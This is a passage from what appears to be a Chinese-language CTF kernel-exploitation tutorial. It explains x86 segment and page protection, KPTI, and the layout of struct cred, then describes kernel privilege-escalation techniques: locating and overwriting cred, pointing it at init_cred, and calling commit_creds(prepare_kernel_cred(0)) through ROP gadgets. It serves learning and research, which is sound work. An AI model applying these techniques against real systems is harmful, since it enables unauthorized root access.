<li>通常，RPL 由调用方设定，用于在段访问中动态降低权限。</li>
</ul>
</li>
</ul>
<h4 id="段描述符（Descriptor）"><a href="#段描述符（Descriptor）" class="headerlink" title="段描述符（Descriptor）"></a>段描述符（Descriptor）</h4><p>每个段在 GDT 或 LDT 中对应一个段描述符。描述符包含了段的基地址、大小、类型和权限等信息。</p>
<p>段描述符的格式如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/5a166703c04f45dcaa7dcbf456f5b673.png"
                      alt="img"
                ></p>
<ul>
<li><p><strong>Base Address（基地址，32 位）</strong>：段的起始地址。在 64 位模式下，基地址通常被固定为 <code>0</code>，即扁平内存模型。</p>
</li>
<li><p><strong>Segment Limit（段大小，20 位）</strong>：定义段的大小（单位为字节）。在 64 位模式下，通常被忽略，因为地址空间被扩展到 48 位或更高。</p>
</li>
<li><p><strong>Access Rights（访问权限，8 位）</strong>：包含段的类型和权限字段：</p>
<ul>
<li><p><strong>类型位（Type）</strong>：定义段的用途，如代码段、数据段或系统段。不同的类型有不同的内存权限。</p>
</li>
<li><p>S 位（Descriptor Type）</p>
<p>：区分系统段（S&#x3D;0）和普通段（S&#x3D;1）。</p>
<ul>
<li><strong>S &#x3D; 0</strong>：系统段（System Segment），包含特定于系统使用的结构或功能，例如任务状态段（TSS）、中断描述符表（IDT）或局部描述符表（LDT）。</li>
<li><strong>S &#x3D; 1</strong>：代码段或数据段，表示常规的用户态或内核态段，用于存储可执行代码或数据。</li>
</ul>
</li>
<li><p><strong>DPL（Descriptor Privilege Level）</strong>：段的权限级别，范围为 <code>0-3</code>，表示对该段的访问要求。</p>
</li>
</ul>
</li>
</ul>
<h4 id="权限类型"><a href="#权限类型" class="headerlink" title="权限类型"></a>权限类型</h4><ul>
<li>CPL（Current Privilege Level）<ul>
<li>表示当前程序的运行权限级别，通常由 CS 寄存器的低两位（代码段段选择子）决定。</li>
<li><strong>CPL</strong> 的值必须低于或等于段描述符中的 DPL 才能访问该段。</li>
</ul>
</li>
<li>RPL（Requested Privilege Level）<ul>
<li>请求访问段时指定的权限级别。通常由访存时使用的段寄存器的段选择子决定</li>
<li><strong>RPL</strong> 的值不能高于段的 DPL。</li>
</ul>
</li>
<li>DPL（Descriptor Privilege Level）<ul>
<li>描述符中定义的段权限级别。</li>
</ul>
</li>
</ul>
<p>简单总结一下，就是当前的执行代码的权限（CPL）和请求访问内存的权限（RPL）都不能低于（值要小于等于）段描述符描述的目标内存的权限。</p>
<h4 id="权限检查过程"><a href="#权限检查过程" class="headerlink" title="权限检查过程"></a>权限检查过程</h4><p>这里以 <code>mov rax, qword ptr ds:[0xdeadbeef]</code> 为例介绍一下段保护机制权限检查的过程。</p>
<ol>
<li><strong>读取 <code>DS</code> 段选择子</strong>：CPU 从 <code>DS</code> 段寄存器中读取段选择子的值。</li>
<li><strong>读取段描述符</strong>：CPU 从 <code>DS</code> 段寄存器中读取段选择子的值。这里先根据段选择子的 <code>TI</code> 位确定是 GDT，然后根据 <code>Index</code> 字段中 GDT 中找到段描述符。</li>
<li><strong>检查 S 位（Descriptor Type）</strong>：因为是访存操作，所以要求 S 位为 1（数据段）。</li>
<li><strong>检查 RPL（Requested Privilege Level）</strong>：CPU 会比较 <code>max(CPL, RPL)</code> 和目标段描述符的 <code>DPL</code>（Descriptor Privilege Level）。如果结果大于目标段的 DPL，则触发 **General Protection Fault (GPF)**。</li>
<li><strong>检查段描述符类型：</strong>根据段描述符的 <strong>Access Rights</strong> 字段的<strong>类型位（Type）</strong>确认操作（读取数据）符合段的权限（RW 位）。</li>
</ol>
<h3 id="页保护机制"><a href="#页保护机制" class="headerlink" title="页保护机制"></a>页保护机制</h3><p>在 64 位系统（如 x86_64 架构）中，<strong>页保护机制</strong>是内存管理的核心，通过分页（Paging）机制实现虚拟地址到物理地址的映射，同时提供<strong>细粒度的权限控制</strong>（例如用户空间与内核空间的隔离）。</p>
<p>提示</p>
<p>关于分页机制会在内存管理部分详细介绍，这里仅介绍权限管理相关内容。</p>
<h4 id="权限字段"><a href="#权限字段" class="headerlink" title="权限字段"></a>权限字段</h4><p>每个页表条目（Page Table Entry, PTE）包含物理地址和权限信息：</p>
<ul>
<li><strong>P（Present）</strong>：第 0 位，表示页是否有效。如果为 <code>0</code>，表示页不在内存中（可能在磁盘上），访问时会触发 <strong>Page Fault</strong>。</li>
<li><strong>R&#x2F;W（Read&#x2F;Write）</strong>：第 1 位，表示页是否可写。如果为 <code>0</code>，则该页只读。</li>
<li><strong>U&#x2F;S（User&#x2F;Supervisor）</strong>：第 2 位，表示用户态（Ring 3）是否可以访问：<ul>
<li><strong>U &#x3D; 1</strong>：用户态可访问。</li>
<li><strong>U &#x3D; 0</strong>：仅内核态（Ring 0）可访问。</li>
</ul>
</li>
<li><strong>NX（No Execute）</strong>：第 63 位，表示页是否可执行：如果为 <code>1</code>，则该页不可执行（需要 CPU 支持 NX 位）。</li>
</ul>
<h4 id="Linux-的-KPTI-机制"><a href="#Linux-的-KPTI-机制" class="headerlink" title="Linux 的 KPTI 机制"></a>Linux 的 KPTI 机制</h4><p><strong>Kernel Page Table Isolation（KPTI）</strong> 是一种内核内存隔离机制，用于解决 <strong>Meltdown 漏洞</strong>。</p>
<blockquote>
<p>Meltdown 是一种硬件级漏洞，该漏洞利用了现代处理器的分支预测和缓存特性，可以通过侧信道攻击绕过用户态与内核态的隔离，使得用户态程序可以读取内核内存中的敏感数据。</p>
<ul>
<li>当用户态访问内核地址时，尽管会触发权限检查失败，但在实际触发前，CPU 已经通过分支预测机制将数据加载到缓存中。</li>
<li>攻击者可以通过读取缓存侧信道（如时间测量等技术）获取这些数据。</li>
</ul>
</blockquote>
<p>KPTI 的核心思想是：</p>
<ul>
<li>在用户态运行时，将内核页表从地址空间中隔离，防止用户态程序对内核地址空间的任何访问。</li>
<li>仅在需要切换到内核态时（如系统调用或中断处理），恢复内核页表。</li>
</ul>
<p>在传统未开启 KPTI 的 Linux 系统中，内核页表和用户页表共存于同一张全局页表（PGD）。开启 KPTI 后，内核为用户态和内核态分别维护两张独立的页全局目录（PGD）。</p>
<ul>
<li><strong>内核页表</strong>：包含用户和内核地址空间的完整映射。</li>
<li><strong>用户页表</strong>：完整映射用户地址空间。但内核地址空间仅保留必要的条目（如系统调用入口和中断处理）。</li>
</ul>
<p>由于每张页全局目录表占用 4 KB，两张页表连续分配在内存中，因此两张全局页目录表的地址仅在第 13 位不同。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/12/15/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%9F%BA%E7%A1%80%E7%AF%87/KPTI.drawio.png"
                      alt="img"
                ></p>
<ul>
<li>用户态进入内核态：当用户态程序通过 <strong>系统调用</strong> 或 <strong>中断</strong> 进入内核态时，会执行用户态页表映射的系统调用入口代码。在这段代码会将 <strong>CR3 寄存器的第 13 位取反</strong>，切换到内核页表，这样就可以访问完整的内核空间。</li>
<li>内核态返回用户态：内核完成系统调用或中断处理后，需要切换回用户态，此时内核通过<strong>取反 CR3 的第 13 位</strong>，切换回用户页表。切换完成后，内核地址空间的绝大部分被剥离，仅保留必要的条目。</li>
</ul>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><a class="link"   target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/kernel-mode/aim/privilege-escalation/change-others/" >参考链接<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>提权方式大致有两个方向：</p>
<ul>
<li>直接修改 cred 结构体的内容。</li>
<li>修改 task_struct 结构体中的 cred 指针指向一个满足要求的 cred。</li>
</ul>
<p>修改的方式有很多种，比如说</p>
<ul>
<li><p>在我们具有任意地址读写后，可以直接修改 cred。</p>
</li>
<li><p>在我们可以 ROP 执行代码后，可以利用 ROP gadget 修改 cred。</p>
</li>
<li><p>修改 cred 指针为内核镜像中已有的 init_cred 的地址。这种方法适合于我们能够直接修改 cred 指针以及知道 init_cred 地址的情况。</p>
</li>
<li><p>伪造一个 cred，然后修改 cred 指针指向该地址即可。这种方式比较麻烦，一般并不使用。</p>
</li>
</ul>
<p>如果我们可以改变特权进程的执行轨迹，也可以实现提权。这里我们从以下角度来考虑如何改变特权进程的执行轨迹。</p>
<ul>
<li>改数据</li>
<li>改代码</li>
</ul>
<h3 id="进程cred指针定位"><a href="#进程cred指针定位" class="headerlink" title="进程cred指针定位"></a>进程cred指针定位</h3><ul>
<li><strong>直接定位</strong></li>
</ul>
<p>cred 结构体的最前面记录了各种 id 信息，对于一个普通的进程而言，uid~fsgid 都是执行进程的用户的身份。因此我们可以通过扫描内存来定位 cred (gdb dump下来扫magic)。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="type">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="type">void</span>        *put_addr;</span><br><span class="line">    <span class="type">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">kuid_t</span>      uid;        <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      gid;        <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      suid;       <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      sgid;       <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      euid;       <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      egid;       <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      fsuid;      <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="type">kgid_t</span>      fsgid;      <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在实际定位的过程中，我们可能会发现很多满足要求的 cred，这主要是因为 cred 结构体可能会被拷贝、释放。一个很直观的想法是在定位的过程中，利用 usage 不为 0 来筛除掉一些 cred，但仍然会发现一些 usage 为 0 的 cred。这是因为 cred 从 usage 为 0， 到释放有一定的时间。此外，cred 是使用 rcu 延迟释放的。</p>
<ul>
<li><strong>间接定位</strong></li>
</ul>
<p><strong>task_struct</strong></p>
<p>进程的 <code>task_struct</code> 结构体中会存放指向 cred 的指针，因此我们可以</p>
<ol>
<li>定位当前进程 <code>task_struct</code> 结构体的地址</li>
<li>根据 cred 指针相对于 task_struct 结构体的偏移计算得出 <code>cred</code> 指针存储的地址</li>
<li>获取 <code>cred</code> 具体的地址</li>
</ol>
<p><strong>comm</strong></p>
<p>comm 用来标记可执行文件的名字，位于进程的 <code>task_struct</code> 结构体中。我们可以发现 comm 其实在 cred 的正下方，所以我们也可以先定位 comm ，然后定位 cred 的地址。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/* Process credentials: */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>     *<span class="title">ptracer_cred</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>     *<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>     *<span class="title">cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="comment">/* Cached requested key. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>          *<span class="title">cached_requested_key</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * executable name, excluding path.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * - normally initialized setup_new_exec()</span></span><br><span class="line"><span class="comment">     * - access it with [gs]et_task_comm()</span></span><br><span class="line"><span class="comment">     * - lock it with task_lock()</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">char</span>                comm[TASK_COMM_LEN];</span><br></pre></td></tr></table></figure></div>

<p>然而，在进程名字并不特殊的情况下，内核中可能会有多个同样的字符串，这会影响搜索的正确性与效率。因此，我们可以使用 prctl 设置进程的 comm 为一个特殊的字符串，然后再开始定位 comm。</p>
<h3 id="commit-creds-prepare-kernel-cred-0"><a href="#commit-creds-prepare-kernel-cred-0" class="headerlink" title="commit_creds(prepare_kernel_cred(0))"></a>commit_creds(prepare_kernel_cred(0))</h3><p>只要我们改变一个进程的 <code>cred</code> 结构体，就能改变其执行权限。内核空间下面有两个函数，都位于 <code>kernel/cred.c</code> 中：</p>
<ul>
<li><code>struct cred* prepare_kernel_cred(struct task_struct* daemon)</code>：该函数用以拷贝一个进程的 <code>cred</code> 结构体，并返回一个新的 <code>cred</code> 结构体，需要注意的是 <code>daemon</code> 参数应为有效的进程描述符地址或者 <code>NULL</code> 。</li>
</ul>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">cred</span> *<span class="built_in">prepare_kernel_cred</span>(<span class="keyword">struct</span> task_struct *daemon)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">cred</span> *old;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">cred</span> *<span class="keyword">new</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">new</span> = <span class="built_in">kmem_cache_alloc</span>(cred_jar, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">kdebug</span>(<span class="string">&quot;prepare_kernel_cred() alloc %p&quot;</span>, <span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (daemon)</span><br><span class="line">		old = <span class="built_in">get_task_cred</span>(daemon);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		old = <span class="built_in">get_cred</span>(&amp;init_cred);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">validate_creds</span>(old);</span><br><span class="line"></span><br><span class="line">	*<span class="keyword">new</span> = *old;</span><br><span class="line">	<span class="keyword">new</span>-&gt;non_rcu = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">atomic_set</span>(&amp;<span class="keyword">new</span>-&gt;usage, <span class="number">1</span>);</span><br><span class="line">	<span class="built_in">set_cred_subscribers</span>(<span class="keyword">new</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">get_uid</span>(<span class="keyword">new</span>-&gt;user);</span><br><span class="line">	<span class="built_in">get_user_ns</span>(<span class="keyword">new</span>-&gt;user_ns);</span><br><span class="line">	<span class="built_in">get_group_info</span>(<span class="keyword">new</span>-&gt;group_info);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="keyword">new</span>-&gt;session_keyring = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">new</span>-&gt;process_keyring = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">new</span>-&gt;thread_keyring = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">new</span>-&gt;request_key_auth = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">new</span>-&gt;jit_keyring = KEY_REQKEY_DEFL_THREAD_KEYRING;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">new</span>-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="keyword">new</span>-&gt;ucounts = <span class="built_in">get_ucounts</span>(<span class="keyword">new</span>-&gt;ucounts);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">new</span>-&gt;ucounts)</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">security_prepare_creds</span>(<span class="keyword">new</span>, old, GFP_KERNEL_ACCOUNT) &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">put_cred</span>(old);</span><br><span class="line">	<span class="built_in">validate_creds</span>(<span class="keyword">new</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">new</span>;</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">	<span class="built_in">put_cred</span>(<span class="keyword">new</span>);</span><br><span class="line">	<span class="built_in">put_cred</span>(old);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>int commit_creds(struct cred *new)</code>：该函数用以将一个新的<code>cred</code>结构体应用到进程。</li>
</ul>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">commit_creds</span><span class="params">(<span class="keyword">struct</span> cred *<span class="keyword">new</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">task_struct</span> *task = current;</span><br><span class="line">	<span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">cred</span> *old = task-&gt;real_cred;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">kdebug</span>(<span class="string">&quot;commit_creds(%p&#123;%d,%d&#125;)&quot;</span>, <span class="keyword">new</span>,</span><br><span class="line">	       <span class="built_in">atomic_read</span>(&amp;<span class="keyword">new</span>-&gt;usage),</span><br><span class="line">	       <span class="built_in">read_cred_subscribers</span>(<span class="keyword">new</span>));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">BUG_ON</span>(task-&gt;cred != old);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="built_in">BUG_ON</span>(<span class="built_in">read_cred_subscribers</span>(old) &lt; <span class="number">2</span>);</span><br><span class="line">	<span class="built_in">validate_creds</span>(old);</span><br><span class="line">	<span class="built_in">validate_creds</span>(<span class="keyword">new</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="built_in">BUG_ON</span>(<span class="built_in">atomic_read</span>(&amp;<span class="keyword">new</span>-&gt;usage) &lt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">get_cred</span>(<span class="keyword">new</span>); <span class="comment">/* we will require a ref for the subj creds too */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* dumpability changes */</span></span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">uid_eq</span>(old-&gt;euid, <span class="keyword">new</span>-&gt;euid) ||</span><br><span class="line">	    !<span class="built_in">gid_eq</span>(old-&gt;egid, <span class="keyword">new</span>-&gt;egid) ||</span><br><span class="line">	    !<span class="built_in">uid_eq</span>(old-&gt;fsuid, <span class="keyword">new</span>-&gt;fsuid) ||</span><br><span class="line">	    !<span class="built_in">gid_eq</span>(old-&gt;fsgid, <span class="keyword">new</span>-&gt;fsgid) ||</span><br><span class="line">	    !<span class="built_in">cred_cap_issubset</span>(old, <span class="keyword">new</span>)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (task-&gt;mm)</span><br><span class="line">			<span class="built_in">set_dumpable</span>(task-&gt;mm, suid_dumpable);</span><br><span class="line">		task-&gt;pdeath_signal = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * If a task drops privileges and becomes nondumpable,</span></span><br><span class="line"><span class="comment">		 * the dumpability change must become visible before</span></span><br><span class="line"><span class="comment">		 * the credential change; otherwise, a __ptrace_may_access()</span></span><br><span class="line"><span class="comment">		 * racing with this change may be able to attach to a task it</span></span><br><span class="line"><span class="comment">		 * shouldn&#x27;t be able to attach to (as if the task had dropped</span></span><br><span class="line"><span class="comment">		 * privileges without becoming nondumpable).</span></span><br><span class="line"><span class="comment">		 * Pairs with a read barrier in __ptrace_may_access().</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="built_in">smp_wmb</span>();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* alter the thread keyring */</span></span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">uid_eq</span>(<span class="keyword">new</span>-&gt;fsuid, old-&gt;fsuid))</span><br><span class="line">		<span class="built_in">key_fsuid_changed</span>(<span class="keyword">new</span>);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">gid_eq</span>(<span class="keyword">new</span>-&gt;fsgid, old-&gt;fsgid))</span><br><span class="line">		<span class="built_in">key_fsgid_changed</span>(<span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* do it</span></span><br><span class="line"><span class="comment">	 * RLIMIT_NPROC limits on user-&gt;processes have already been checked</span></span><br><span class="line"><span class="comment">	 * in set_user().</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="built_in">alter_cred_subscribers</span>(<span class="keyword">new</span>, <span class="number">2</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">new</span>-&gt;user != old-&gt;user || <span class="keyword">new</span>-&gt;user_ns != old-&gt;user_ns)</span><br><span class="line">		<span class="built_in">inc_rlimit_ucounts</span>(<span class="keyword">new</span>-&gt;ucounts, UCOUNT_RLIMIT_NPROC, <span class="number">1</span>);</span><br><span class="line">	<span class="built_in">rcu_assign_pointer</span>(task-&gt;real_cred, <span class="keyword">new</span>);</span><br><span class="line">	<span class="built_in">rcu_assign_pointer</span>(task-&gt;cred, <span class="keyword">new</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">new</span>-&gt;user != old-&gt;user || <span class="keyword">new</span>-&gt;user_ns != old-&gt;user_ns)</span><br><span class="line">		<span class="built_in">dec_rlimit_ucounts</span>(old-&gt;ucounts, UCOUNT_RLIMIT_NPROC, <span class="number">1</span>);</span><br><span class="line">	<span class="built_in">alter_cred_subscribers</span>(old, <span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* send notifications */</span></span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">uid_eq</span>(<span class="keyword">new</span>-&gt;uid,   old-&gt;uid)  ||</span><br><span class="line">	    !<span class="built_in">uid_eq</span>(<span class="keyword">new</span>-&gt;euid,  old-&gt;euid) ||</span><br><span class="line">	    !<span class="built_in">uid_eq</span>(<span class="keyword">new</span>-&gt;suid,  old-&gt;suid) ||</span><br><span class="line">	    !<span class="built_in">uid_eq</span>(<span class="keyword">new</span>-&gt;fsuid, old-&gt;fsuid))</span><br><span class="line">		<span class="built_in">proc_id_connector</span>(task, PROC_EVENT_UID);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">gid_eq</span>(<span class="keyword">new</span>-&gt;gid,   old-&gt;gid)  ||</span><br><span class="line">	    !<span class="built_in">gid_eq</span>(<span class="keyword">new</span>-&gt;egid,  old-&gt;egid) ||</span><br><span class="line">	    !<span class="built_in">gid_eq</span>(<span class="keyword">new</span>-&gt;sgid,  old-&gt;sgid) ||</span><br><span class="line">	    !<span class="built_in">gid_eq</span>(<span class="keyword">new</span>-&gt;fsgid, old-&gt;fsgid))</span><br><span class="line">		<span class="built_in">proc_id_connector</span>(task, PROC_EVENT_GID);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* release the old obj and subj refs both */</span></span><br><span class="line">	<span class="built_in">put_cred</span>(old);</span><br><span class="line">	<span class="built_in">put_cred</span>(old);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>也就是说我们只要想办法在内核空间执行 <code>commit_creds(prepare_kernel_cred(0))</code> 即可获得 <code>root</code> 权限，<code>0</code> 表示 以 <code>0</code> 号进程作为参考准备新的 <code>credentials</code>。如果进行 <code>ROP</code> 提权有一个难点就是寻找将 rax 赋值给 rdi 的 gadget 。可以尝试搜索 <code>xchg rax, rdi</code> ，<code>push rax; pop rdi</code>，<code>mov rdi, rax</code> 等 <code>gadget</code> 。</p>
